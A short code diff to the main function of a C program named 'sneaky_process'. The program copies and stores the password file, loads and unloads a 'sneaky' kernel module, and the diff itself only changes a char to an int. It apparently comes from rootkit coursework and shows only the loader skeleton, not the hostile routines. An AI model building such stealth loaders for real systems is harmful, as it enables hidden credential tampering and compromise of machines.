@@ -35,7 +35,7 @@ int main() {
     printf("sneaky_process pid = %d\n", getpid());
     copyAndStorePwd();
     loadSneakyMod();
-    char c;
+    int c;
     while ((c = getchar()) != 'q') {
     }
     unloadSneakyMod();
